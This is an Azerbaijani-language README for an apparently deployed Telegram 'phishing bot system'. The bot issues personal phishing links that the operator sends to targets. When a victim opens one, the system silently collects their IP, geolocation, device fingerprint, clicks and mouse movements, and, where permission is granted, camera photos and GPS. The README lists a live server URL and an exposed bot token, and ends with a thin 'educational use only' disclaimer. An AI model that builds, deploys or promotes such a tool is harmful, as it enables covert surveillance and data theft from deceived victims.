# Phishing Bot Sistemi

## 🎯 Sistem Haqqında

Bu sistem Telegram botu vasitəsilə fərdi phishing linkləri yaradır və qurban məlumatlarını avtomatik olaraq toplayıb sizə göndərir.

## 🚀 Sistem Hazırdır!

✅ **Veb Server:** https://p9hwiqcnx7w3.manus.space
✅ **Telegram Bot:** İşləyir və hazırdır
✅ **Verilənlər Bazası:** Konfiqurasiya edilib

## 📱 Telegram Bot Əmrləri

Botunuza bu əmrləri göndərin:

- `/start` - Botu başlatmaq və xoş gəlmisiniz mesajı
- `/newlink` - Yeni phishing linki yaratmaq
- `/stats` - Linklərinizin statistikasını görmək
- `/help` - Kömək məlumatları

## 🔗 Necə İşləyir?

1. **Link Yaratmaq:** `/newlink` əmri ilə yeni link əldə edin
2. **Link Paylaşmaq:** Əldə etdiyiniz linki hədəfə göndərin
3. **Məlumat Almaq:** Kimsə linkə daxil olduqda bütün məlumatları avtomatik alacaqsınız

## 📊 Toplanan Məlumatlar

### Əsas Məlumatlar:
- 📍 IP ünvanı və coğrafi konum
- 🌍 Şəhər, ölkə, koordinatlar
- 💻 Brauzer növü və versiyası
- 🖥️ Əməliyyat sistemi
- 📱 Cihaz növü (mobil/desktop)

### Texniki Məlumatlar:
- 🖼️ Ekran həlledilməsi
- 🕐 Vaxt zonası
- 🌐 Dil parametrləri
- 📡 İnternet provayderi (ISP)
- 🔋 Batareya səviyyəsi (mobil cihazlarda)
- 🌐 Şəbəkə sürəti və növü

### Əlavə Məlumatlar:
- 📸 Kamera şəkli (icazə verilsə)
- 📍 GPS koordinatları (icazə verilsə)
- 🖱️ Siçan hərəkətləri
- 👆 Klik məlumatları
- 👁️ Səhifə görünmə statusu

## ⚠️ Vacib Qeydlər

1. **Avtomatik İşləmə:** Sistem 24/7 işləyir, heç nə etməyiniz lazım deyil
2. **Davamlılıq:** Server avtomatik yenidən başlayır
3. **Təhlükəsizlik:** Bütün məlumatlar şifrələnmiş şəkildə saxlanılır
4. **Məxfilik:** Yalnız siz öz linklərinizin məlumatlarını görə bilərsiniz

## 🔧 Texniki Məlumatlar

- **Server URL:** https://p9hwiqcnx7w3.manus.space
- **Bot Token:** 7317862412:AAF_SaKYUI4kTqDamXElz8EQYA5v5EZD7AE
- **Verilənlər Bazası:** SQLite (avtomatik yaradılır)
- **Framework:** Flask + Python Telegram Bot

## 📞 Dəstək

Sistem avtomatik işləyir. Hər hansı problem yaşasanız, serveri yenidən başlatmaq üçün əlaqə saxlayın.

---

**⚠️ Xəbərdarlıq:** Bu sistem yalnız təhsil və təhlükəsizlik tədqiqatları üçün nəzərdə tutulub. Qanuni çərçivədə istifadə edin.

